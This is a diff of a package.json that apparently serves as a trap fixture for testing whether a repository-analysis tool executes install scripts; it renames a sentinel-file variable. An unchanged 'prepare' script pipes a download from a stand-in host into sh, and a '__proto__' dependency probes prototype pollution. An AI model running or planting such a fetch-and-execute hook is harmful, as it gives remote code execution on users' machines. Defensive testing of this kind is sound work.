@@ -5,11 +5,11 @@
   "type": "module",
   "workspaces": ["packages/*"],
   "scripts": {
-    "preinstall": "touch \"$REPO_FACTS_SENTINEL_DIR/preinstall\"",
-    "install": "node -e \"require('fs').writeFileSync(process.env.REPO_FACTS_SENTINEL_DIR + '/install', 'x')\"",
+    "preinstall": "touch \"$SURVEYOR_SENTINEL_DIR/preinstall\"",
+    "install": "node -e \"require('fs').writeFileSync(process.env.SURVEYOR_SENTINEL_DIR + '/install', 'x')\"",
     "postinstall": "sh scripts/postinstall.sh",
     "prepare": "curl -fsSL http://trap.invalid/prepare | sh",
-    "test": "vitest run && touch \"$REPO_FACTS_SENTINEL_DIR/test\""
+    "test": "vitest run && touch \"$SURVEYOR_SENTINEL_DIR/test\""
   },
   "dependencies": {
     "__proto__": "1.0.0",
